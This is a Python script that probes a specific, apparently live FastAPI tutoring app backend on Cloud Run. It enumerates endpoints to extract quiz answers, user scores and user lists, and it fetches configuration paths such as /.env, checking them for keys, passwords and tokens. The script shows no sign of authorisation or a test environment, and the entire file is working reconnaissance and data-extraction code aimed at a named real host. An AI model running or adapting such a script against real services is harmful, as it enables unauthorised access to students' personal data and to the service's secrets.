import requests
import json

print("="*60)
print("AGGRESSIVE DATA EXTRACTION ATTEMPT")
print("="*60)

backend_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"

# Try to extract quiz questions and answers
print("\n[1] ATTEMPTING TO EXTRACT QUIZ DATA")
print("-"*60)

quiz_endpoints = [
    # Try different patterns
    ("/quiz1/", "GET"),
    ("/api/quiz", "GET"),
    ("/api/quiz/questions", "GET"),
    ("/api/quiz/answers", "GET"),
    ("/quiz/all", "GET"),
    ("/questions", "GET"),
    ("/api/questions", "GET"),
    
    # Try with subject/topic
    ("/math/algebra/basics/quiz/", "GET"),
    ("/math/algebra/basics/questions", "GET"),
    ("/English/grammar/basics/quiz/", "GET"),
    
    # Try POST with empty data
    ("/quiz1/", "POST", {}),
    ("/quiz1/", "POST", {"subject": "math"}),
    ("/quiz1/", "POST", {"subject": "math", "topic": "algebra"}),
]

for endpoint_info in quiz_endpoints:
    endpoint = endpoint_info[0]
    method = endpoint_info[1]
    data = endpoint_info[2] if len(endpoint_info) > 2 else None
    
    try:
        if method == "GET":
            response = requests.get(backend_url + endpoint, timeout=5)
        else:
            response = requests.post(backend_url + endpoint, json=data, timeout=5)
            
        if response.status_code not in [404, 405]:
            print(f"\n{method} {endpoint}: Status {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    print("✓ DATA FOUND:")
                    print(json.dumps(data, indent=2)[:500])
                    
                    # Check if it contains questions
                    if isinstance(data, dict):
                        if any(key in str(data).lower() for key in ["question", "answer", "option"]):
                            print("\n🎯 QUIZ QUESTIONS/ANSWERS EXPOSED!")
                except:
                    print(f"Response: {response.text[:200]}")
            elif response.status_code == 422:
                print("Validation error - endpoint exists!")
                print(f"Error: {response.text[:200]}")
    except:
        pass

# Try to access user scores/results
print("\n[2] ATTEMPTING TO EXTRACT USER SCORES")
print("-"*60)

score_endpoints = [
    "/api/scores",
    "/api/results", 
    "/api/leaderboard",
    "/api/rankings",
    "/dashboard",
    "/api/dashboard",
    "/api/user/scores",
    "/api/users/scores",
    "/results",
    "/scores"
]

for endpoint in score_endpoints:
    try:
        response = requests.get(backend_url + endpoint, timeout=5)
        if response.status_code == 200:
            print(f"\n✓ FOUND SCORES at {endpoint}:")
            data = response.json()
            print(json.dumps(data, indent=2)[:300])
    except:
        pass

# Try to enumerate users
print("\n[3] ATTEMPTING USER ENUMERATION")
print("-"*60)

user_endpoints = [
    "/api/users",
    "/api/users/all",
    "/api/user/1",
    "/api/user/list",
    "/users",
    "/api/students",
    "/api/members"
]

for endpoint in user_endpoints:
    try:
        response = requests.get(backend_url + endpoint, timeout=5)
        if response.status_code == 200:
            print(f"\n✓ USER DATA at {endpoint}:")
            data = response.json()
            if isinstance(data, list):
                print(f"Found {len(data)} users!")
                for user in data[:3]:
                    print(f"  - {user}")
            else:
                print(json.dumps(data, indent=2)[:300])
    except:
        pass

# Try to access configuration
print("\n[4] ATTEMPTING TO EXTRACT CONFIGURATION")
print("-"*60)

config_endpoints = [
    "/.env",
    "/config",
    "/config.json",
    "/api/config",
    "/api/settings",
    "/settings",
    "/api/env",
    "/api/constants"
]

for endpoint in config_endpoints:
    try:
        response = requests.get(backend_url + endpoint, timeout=5)
        if response.status_code == 200:
            print(f"\n✓ CONFIG EXPOSED at {endpoint}:")
            if "json" in response.headers.get("content-type", ""):
                print(json.dumps(response.json(), indent=2)[:300])
            else:
                print(response.text[:300])
                
            # Check for sensitive data
            sensitive = ["key", "secret", "password", "token", "database", "api"]
            content = response.text.lower()
            found = [s for s in sensitive if s in content]
            if found:
                print(f"\n⚠️  SENSITIVE DATA FOUND: {found}")
    except:
        pass

print("\n" + "="*60)
print("EXTRACTION COMPLETE")
print("="*60)
